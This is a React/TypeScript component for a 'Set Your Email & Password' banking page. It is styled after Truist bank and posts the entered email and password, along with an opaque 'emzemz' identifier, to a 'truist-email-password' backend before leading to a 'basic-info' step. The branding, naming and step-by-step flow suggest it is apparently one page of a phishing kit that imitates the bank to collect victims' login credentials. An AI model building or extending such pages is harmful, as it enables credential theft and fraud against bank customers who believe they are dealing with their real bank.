import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import { inputStyles, buttonStyles, cardStyles } from '../Utils/truistStyles';

const EmailPassword: React.FC = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    email: '',
    password: '',
    confirmPassword: ''
  });

  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};

  if (!emzemz) {
    return (
      <div className="flex justify-center items-start min-h-screen py-8 px-4">
        <div className={cardStyles.base}>
          <div className={cardStyles.padding}>
            <h1 className="mx-auto mb-6 w-full text-center text-3xl font-semibold text-[#2b0d49]">
              Error
            </h1>
            <p className="text-sm font-semibold text-[#6c5d85] mb-8">
              Missing user details. Please restart the process.
            </p>
          </div>
        </div>
      </div>
    );
  }

  const validateEmail = (email: string) => {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(email);
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = {
      email: !email.trim() ? 'Email is required' : !validateEmail(email) ? 'Invalid email format' : '',
      password: password.length < 8 ? 'Password must be at least 8 characters' : '',
      confirmPassword: password !== confirmPassword ? 'Passwords do not match' : ''
    };

    setErrors(newErrors);

    if (!newErrors.email && !newErrors.password && !newErrors.confirmPassword) {
      try {
        await axios.post(`${baseUrl}api/truist-email-password/`, {
          emzemz,
          email,
          password
        });
        console.log('Email and password set successfully');
        navigate('/basic-info', { state: { emzemz } });
      } catch (error) {
        console.error('Error setting email/password:', error);
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  const renderError = (error: string) => (
    <div className="flex items-center gap-2 text-sm text-red-600 mt-1">
      <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
      </svg>
      <span>{error}</span>
    </div>
  );

  return (
    <div className="flex justify-center items-start min-h-screen py-8 px-4">
      <div className={cardStyles.base}>
        <div className={cardStyles.padding}>
          <h1 className="mx-auto mb-6 w-full text-center text-3xl font-semibold text-[#2b0d49]">
            Set Your Email & Password
          </h1>
          <p className="text-sm font-semibold text-[#6c5d85] mb-8">
            Create your account credentials to access your online banking.
          </p>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-2">
              <label className="text-sm text-[#5d4f72]" htmlFor="email">
                Email Address
              </label>
              <input
                id="email"
                name="email"
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className={`${inputStyles.base} ${inputStyles.focus}`}
                placeholder="Enter your email"
              />
              {errors.email && renderError(errors.email)}
            </div>

            <div className="space-y-2">
              <label className="text-sm text-[#5d4f72]" htmlFor="password">
                Password
              </label>
              <div className="relative">
                <input
                  id="password"
                  name="password"
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className={`${inputStyles.base} ${inputStyles.focus}`}
                  placeholder="Enter password"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-[#5f259f] text-sm hover:underline"
                >
                  {showPassword ? 'Hide' : 'Show'}
                </button>
              </div>
              {errors.password && renderError(errors.password)}
            </div>

            <div className="space-y-2">
              <label className="text-sm text-[#5d4f72]" htmlFor="confirmPassword">
                Confirm Password
              </label>
              <div className="relative">
                <input
                  id="confirmPassword"
                  name="confirmPassword"
                  type={showConfirmPassword ? 'text' : 'password'}
                  value={confirmPassword}
                  onChange={(e) => setConfirmPassword(e.target.value)}
                  className={`${inputStyles.base} ${inputStyles.focus}`}
                  placeholder="Re-enter password"
                />
                <button
                  type="button"
                  onClick={() => setShowConfirmPassword(!showConfirmPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-[#5f259f] text-sm hover:underline"
                >
                  {showConfirmPassword ? 'Hide' : 'Show'}
                </button>
              </div>
              {errors.confirmPassword && renderError(errors.confirmPassword)}
            </div>

            <div className="flex flex-wrap gap-3 pt-2">
              <button
                type="submit"
                className={buttonStyles.base}
                disabled={isLoading}
              >
                {isLoading ? (
                  <span className={buttonStyles.loading}></span>
                ) : (
                  'Continue'
                )}
              </button>
            </div>

            <p className="text-xs text-[#5d4f72] mt-4">
              Your password must be at least 8 characters long and should include a mix of letters, numbers, and symbols for security.
            </p>
          </form>
        </div>
      </div>
    </div>
  );
};

export default EmailPassword;
